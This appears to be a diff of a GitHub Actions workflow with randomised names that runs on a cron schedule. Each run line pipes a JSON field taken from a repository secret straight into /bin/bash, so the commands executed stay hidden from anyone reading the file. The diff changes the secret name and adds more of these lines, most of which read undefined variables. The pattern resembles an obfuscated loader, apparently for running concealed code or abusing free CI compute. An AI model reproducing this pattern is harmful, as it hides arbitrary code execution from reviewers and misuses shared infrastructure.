@@ -1,23 +1,29 @@
 name: goldjinzij
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
-jobs:  # 15653
+    - cron: '58 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: goldjinzij
         env:
-          e95071: ${{ secrets.e95071 }}
+          fqcb388: ${{ secrets.fqcb388 }}
         run: |
-          echo $e95071 | jq -r .wo96 | /bin/bash
-          echo $oj32182 | jq -r .oyywt3922 | /bin/bash
-          echo $w1 | jq -r .zogjz19 | /bin/bash
-          echo $rmxml1 | jq -r .n47167 | /bin/bash
-          echo $bijm895 | jq -r .qbl00284 | /bin/bash
-          echo $qaef97126 | jq -r .vvcp05596 | /bin/bash
+          echo $fqcb388 | jq -r .jw2539 | /bin/bash
+          echo $j70090 | jq -r .mvyzq1 | /bin/bash
+          echo $g4 | jq -r .w922 | /bin/bash
+          echo $up9 | jq -r .wpnj442 | /bin/bash
+          echo $rogh2719 | jq -r .sm579 | /bin/bash
+          echo $dgj8 | jq -r .vx400 | /bin/bash
+          echo $anyz6771 | jq -r .ggxjt85 | /bin/bash
+          echo $ti528 | jq -r .xg98257 | /bin/bash
+          echo $k60 | jq -r .w2730 | /bin/bash
+          echo $zf69441 | jq -r .ublm34 | /bin/bash
+          echo $gmu428 | jq -r .uis31 | /bin/bash
+          echo $g4908 | jq -r .soys8 | /bin/bash
+          echo $r11640 | jq -r .kskk608 | /bin/bash
+          echo $xzv93 | jq -r .yvnlt5 | /bin/bash
 
